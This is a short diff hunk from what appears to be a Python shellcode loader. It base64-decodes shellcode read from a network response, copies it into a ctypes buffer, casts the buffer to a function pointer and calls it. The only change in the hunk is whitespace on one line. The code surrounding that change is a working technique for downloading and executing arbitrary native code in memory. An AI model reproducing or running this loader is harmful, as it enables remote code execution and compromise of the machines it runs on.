@@ -13,7 +13,7 @@ shellcode = base64.b64decode(response.read())
 shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
 
 # create a function pointer to our shellcode
-shellcode_func   = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
+shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
 
 # call our shellcode
 shellcode_func()
